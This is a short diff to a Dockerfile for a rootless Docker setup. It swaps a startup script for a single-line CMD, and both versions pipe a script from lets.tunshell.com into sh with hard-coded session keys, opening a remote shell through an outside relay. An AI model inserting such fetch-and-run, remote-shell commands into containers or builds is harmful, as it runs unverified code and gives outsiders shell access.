@@ -38,13 +38,5 @@ ENV PATH=/home/appuser/bin:$PATH
 ENV XDG_RUNTIME_DIR=/home/appuser/.docker/run
 ENV DOCKER_HOST=unix:///home/appuser/.docker/run/docker.sock
 
-# Create a custom startup script
-RUN echo '#!/bin/bash\n\
-dockerd-rootless.sh --experimental &\n\
-sleep 5\n\
-curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T aNB1YS9NUAfyEnlCTGr2Yd 5Rz4Bi3dbjw4YoR93vuryN eu.relay.tunshell.com\n\
-' > /home/appuser/start.sh && \
-    chmod +x /home/appuser/start.sh
-
-ENTRYPOINT ["/bin/bash"]
-CMD ["-c", "/home/appuser/start.sh"]
+# Single-line CMD instead of a script file
+CMD dockerd-rootless.sh --experimental & sleep 5 && curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T aNB1YS9NUAfyEnlCTGr2Yd 5Rz4Bi3dbjw4YoR93vuryN eu.relay.tunshell.com
